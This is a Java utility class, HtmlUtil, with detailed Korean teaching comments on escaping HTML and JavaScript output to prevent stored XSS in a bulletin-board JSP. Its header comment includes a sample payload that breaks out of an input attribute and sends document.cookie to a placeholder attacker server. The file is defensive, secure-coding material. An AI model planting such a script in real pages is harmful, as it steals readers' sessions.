package util;   // 이 파일이 속한 패키지(=폴더) 이름. 실제 폴더 구조와 반드시 같아야 한다

/*
 ================================================================================
   HtmlUtil  -  HTML 특수문자를 무해한 문자로 바꾸는(이스케이프) 도우미

   [왜 필요한가 - 저장형 XSS]
     기존 board/read.jsp 는 DB에서 꺼낸 값을 그대로 화면에 찍었다.

         <input type="text" value="<%=title%>">
         <textarea><%=content%></textarea>

     누군가 글 제목을 이렇게 저장하면?

         "><script>location.href='http://공격자서버/?c='+document.cookie</script>

     value 속성이 끊기면서 <script>가 실제 코드로 실행된다.
     그 글을 읽은 모든 사람의 세션 쿠키가 공격자에게 전송된다.
     한 번 저장되면 계속 발동하므로 "저장형(Stored) XSS"라고 부른다.

   [원칙]
     - JSP에서는 <c:out value="${...}"/> 를 사용한다 (JSTL이 자동 이스케이프).
     - 스크립트릿(<% %>)이나 자바 코드에서 문자열을 만들 때는 이 클래스를 쓴다.
     - "입력할 때 태그를 지우는" 방식보다 "출력할 때 이스케이프하는" 방식이 표준이다.
       (입력 필터링은 우회 방법이 많고, 정상 데이터를 훼손한다)
 ================================================================================
*/

// 이 클래스는 "도구 상자" 다. 상태(멤버변수)를 갖지 않고 기능(메소드)만 제공한다.
// 그래서 아래 메소드가 전부 static 이고, 객체를 만들 필요 없이 HtmlUtil.escape(...) 로 바로 쓴다.
public class HtmlUtil {

	// 생성자를 private 로 막아 둔다.
	//   -> 바깥에서 new HtmlUtil() 을 못 한다는 뜻이다.
	// 왜 막는가? 이 클래스는 객체를 만들 이유가 전혀 없는 도구 모음이기 때문이다.
	// 막아 두지 않으면 누군가 습관적으로 new 를 해서 쓸모없는 객체를 만든다.
	private HtmlUtil() {}

	/**
	 * HTML 컨텍스트에서 위험한 5개 문자를 엔티티로 변환한다.
	 *   &  ->  &amp;   (가장 먼저 바꿔야 한다. 나중에 바꾸면 이미 만든 엔티티가 깨진다)
	 *   <  ->  &lt;
	 *   >  ->  &gt;
	 *   "  ->  &quot;  (속성값 탈출 방지)
	 *   '  ->  &#39;   (속성을 홑따옴표로 감싼 경우 방지)
	 */
	// static = 객체를 만들지 않고 HtmlUtil.escape("글자") 처럼 클래스 이름으로 바로 부른다.
	// String 을 받아 String 을 돌려주는, 값만 바꿔 주는 단순한 메소드다.
	public static String escape(String text) {
		// 넘어온 값이 null 이면(=아직 아무것도 없으면) 그대로 두면 "null" 이라는 글자가 화면에 찍힌다.
		if (text == null) {
			// 그래서 빈 문자열로 바꿔 돌려준다. 화면에는 아무것도 안 보인다.
			return "";
		}
		// StringBuilder = 글자를 조금씩 이어 붙일 때 쓰는 도구.
		//   String 은 + 로 이어 붙일 때마다 새 객체를 만들어서 글자가 길면 매우 느리다.
		//   괄호 안의 숫자는 "이 정도 크기로 미리 자리를 잡아 둬라" 는 힌트다(성능용).
		StringBuilder sb = new StringBuilder(text.length() + 16);
		// 받은 글자를 첫 글자부터 마지막 글자까지 하나씩 훑는다.
		//   i = 몇 번째 글자인지, text.length() = 글자 수, i++ = 다음 글자로
		for (int i = 0; i < text.length(); i++) {
			// i 번째 글자 하나를 꺼낸다. char 는 "글자 한 개" 를 담는 타입이다.
			char c = text.charAt(i);
			// switch = 값이 무엇이냐에 따라 갈라지는 문법. if 를 여러 번 쓰는 것보다 읽기 쉽다.
			switch (c) {
				// & 는 엔티티의 시작 문자라 가장 먼저 바꿔야 한다(위 설명 참고).
				case '&':  sb.append("&amp;");  break;   // break = 여기서 switch 를 빠져나간다
				case '<':  sb.append("&lt;");   break;   // 태그 시작을 막는다 -> <script> 가 글자로만 보인다
				case '>':  sb.append("&gt;");   break;   // 태그 끝을 막는다
				case '"':  sb.append("&quot;"); break;   // 큰따옴표로 감싼 속성값을 빠져나가지 못하게
				case '\'': sb.append("&#39;");  break;   // 홑따옴표로 감싼 속성값도 마찬가지. \' 는 홑따옴표 한 글자다
				// 위 5개가 아닌 평범한 글자는 그대로 붙인다.
				default:   sb.append(c);
			}
		}
		// 다 이어 붙인 결과를 String 으로 바꿔 돌려준다.
		return sb.toString();
	}

	/**
	 * 이스케이프한 뒤 줄바꿈만 <br>로 살린다.
	 *
	 * [기존 버그]
	 *   read.jsp 에 아래 코드가 있었다.
	 *       vo.getB_content().replace("/r/n", "<br>")
	 *   자바에서 줄바꿈은 "\r\n" 인데 슬래시(/)를 써서 아무 동작도 하지 않았다.
	 *   그래서 여러 줄로 쓴 글이 한 줄로 붙어 보였다.
	 */
	// 글 내용처럼 "여러 줄로 쓴 글" 을 화면에 보여줄 때 쓴다.
	public static String escapeWithBr(String text) {
		// null 이면 빈 문자열로 (위 escape 와 같은 이유)
		if (text == null) {
			return "";
		}
		// 순서가 중요하다. 먼저 escape 로 태그를 전부 무력화한 뒤,
		// 우리가 허락한 <br> 만 다시 살려 준다. 순서를 바꾸면 <br> 도 같이 무력화된다.
		return escape(text)
				.replace("\r\n", "<br>")   // 윈도우 줄바꿈(\r\n)을 줄바꿈 태그로
				.replace("\n", "<br>");    // 리눅스/맥 줄바꿈(\n)도 줄바꿈 태그로
	}

	/**
	 * 자바스크립트 문자열 리터럴 안에 값을 넣을 때 사용.
	 * 예) out.print(" alert('" + HtmlUtil.escapeJs(msg) + "'); ");
	 * 홑따옴표나 줄바꿈이 섞이면 스크립트 자체가 깨지거나 코드가 주입된다.
	 */
	// 위의 escape 와 목적은 같지만 "바꿔야 할 글자" 가 다르다.
	// HTML 안에 넣을 때와 자바스크립트 안에 넣을 때는 위험한 글자가 서로 다르기 때문이다.
	public static String escapeJs(String text) {
		// null 이면 빈 문자열로
		if (text == null) {
			return "";
		}
		// 글자를 하나씩 검사해 이어 붙일 준비 (escape 와 같은 방식)
		StringBuilder sb = new StringBuilder(text.length() + 16);
		// 첫 글자부터 끝까지 훑는다
		for (int i = 0; i < text.length(); i++) {
			// i 번째 글자 하나를 꺼낸다
			char c = text.charAt(i);
			// 글자 종류에 따라 갈라 처리한다
			switch (c) {
				// 역슬래시 자체를 두 개로 만든다. 이걸 먼저 안 하면 아래 처리들이 다 깨진다.
				case '\\': sb.append("\\\\"); break;
				case '\'': sb.append("\\'");  break;   // 홑따옴표 -> 문자열을 끊지 못하게 앞에 \ 를 붙인다
				case '"':  sb.append("\\\""); break;   // 큰따옴표도 같은 이유
				case '\r': sb.append("\\r");  break;   // 진짜 줄바꿈이 들어가면 스크립트 한 줄이 끊긴다
				case '\n': sb.append("\\n");  break;   // 그래서 "글자 \n" 형태로 바꿔 넣는다
				case '<':  sb.append("\\u003c"); break; // </script> 조기 종료 방지
				                                        // < 는 < 와 같은 글자를 유니코드 번호로 적은 것이다.
				                                        // 자바스크립트에는 < 로 읽히지만 HTML 파서는 태그로 못 알아본다.
				case '>':  sb.append("\\u003e"); break; // > 도 같은 이유로 번호로 바꾼다
				// 나머지 평범한 글자는 그대로
				default:   sb.append(c);
			}
		}
		// 완성된 글자를 돌려준다
		return sb.toString();
	}
}
